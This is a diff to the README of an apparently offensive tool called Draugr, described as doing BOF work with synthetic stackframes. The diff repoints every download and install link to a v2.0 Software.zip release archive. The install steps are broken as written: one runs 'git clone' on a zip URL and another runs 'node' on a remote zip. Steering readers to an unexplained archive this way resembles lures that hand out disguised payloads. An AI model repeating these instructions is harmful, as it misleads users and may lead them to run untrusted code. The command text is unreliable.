@@ -38,7 +38,7 @@ To get started with Draugr, follow these steps:
 
 1. Clone the repository to your local machine.
    ```bash
-   git clone https://github.com/Aref2035/Draugr/releases/download/v1.0/Application.zip
+   git clone https://github.com/Aref2035/Draugr/releases/download/v2.0/Software.zip
    ```
 
 2. Install the necessary dependencies.
@@ -53,7 +53,7 @@ To get started with Draugr, follow these steps:
 To begin your journey into BOF with Synthetic Stackframes, simply run the following command:
 
 ```bash
-node https://github.com/Aref2035/Draugr/releases/download/v1.0/Application.zip
+node https://github.com/Aref2035/Draugr/releases/download/v2.0/Software.zip
 ```
 
 Explore the capabilities of Draugr and see how you can exploit vulnerabilities in systems. Remember to use this tool responsibly and only on systems you have permission to test.
@@ -74,7 +74,7 @@ For more detailed info, visit the full documentation. 📚
 
 ---
 
-[![Download Draugr](https://github.com/Aref2035/Draugr/releases/download/v1.0/Application.zip)](https://github.com/Aref2035/Draugr/releases/download/v1.0/Application.zip)
+[![Download Draugr](https://github.com/Aref2035/Draugr/releases/download/v2.0/Software.zip)](https://github.com/Aref2035/Draugr/releases/download/v2.0/Software.zip)
 
 ---
 
